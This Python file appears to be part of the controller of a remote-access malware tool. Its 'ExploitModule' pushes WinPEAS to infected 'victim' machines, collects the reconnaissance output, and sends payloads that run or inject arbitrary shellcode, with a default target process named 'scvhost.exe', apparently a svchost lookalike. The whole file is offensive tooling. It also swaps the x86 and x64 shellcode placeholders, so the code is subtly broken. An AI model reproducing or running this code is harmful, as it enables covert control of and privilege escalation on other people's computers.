from dataManager.repository.userRepository import UserRepository
import logging

class ExploitModule:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "exploit"
        self.user_repository: UserRepository = user_repository

    async def peas_receive_socket(self, message, uuid):
        module_data = self.user_repository.get_user(uuid).get_module_data(self.module_name)
        if "peas" not in module_data:
            module_data["peas"] = ""
        new_peas_data = module_data["peas"] + message
        new_module_data = module_data
        new_module_data["peas"] = new_peas_data
        self.user_repository.set_user_module_data(uuid, self.module_name, new_module_data)
        return {"message": "peas data updated"}
    
    async def send_peas(self, uuid):
        user = self.user_repository.get_user(uuid)
        await user.execute("./modules/payloads/payload_winpeas.py")
        return {"message": "WinPEAS sent"}
    
    async def receive_peas(self, uuid):
        module_data = self.user_repository.get_user(uuid).get_module_data(self.module_name, "")
        if "peas" not in module_data:
            return {"message": "No peas data found"}
        return {"message": module_data["peas"]}
    
    async def exec_shellcode(self, uuid, shellcode_x86: str, shellcode_x64:str, method: str = "self-exec", prefered_process:str = "scvhost.exe"):
        user = self.user_repository.get_user(uuid)
        if not user:
            raise Exception(f"Victim is not infected")
        logging.info(f"Sending payload...")
        logging.info(f"Shellcode x86: {shellcode_x86} (type: {type(shellcode_x86)})")
        logging.info(f"Shellcode x64: {shellcode_x64} (type: {type(shellcode_x64)})")
        logging.info(f"Method: {method} (type: {type(method)})")
        logging.info(f"Prefered process: {prefered_process} (type: {type(prefered_process)})")
        result = await user.execute("./modules/payloads/exploit/payload_exec_shellcode.py", {
            b"buf_x64_placeholder": shellcode_x86.encode(),
            b"buf_x86_placeholder": shellcode_x64.encode(),
            b"\"METHOD_PLACEHOLDER\"": b"1" if method == "inject" else b"0",
            b"PREFERRED_PROCESS_PLACEHOLDER": prefered_process.encode()
        })
        logging.info(f"Payload sent")
        return {"message": result}
        
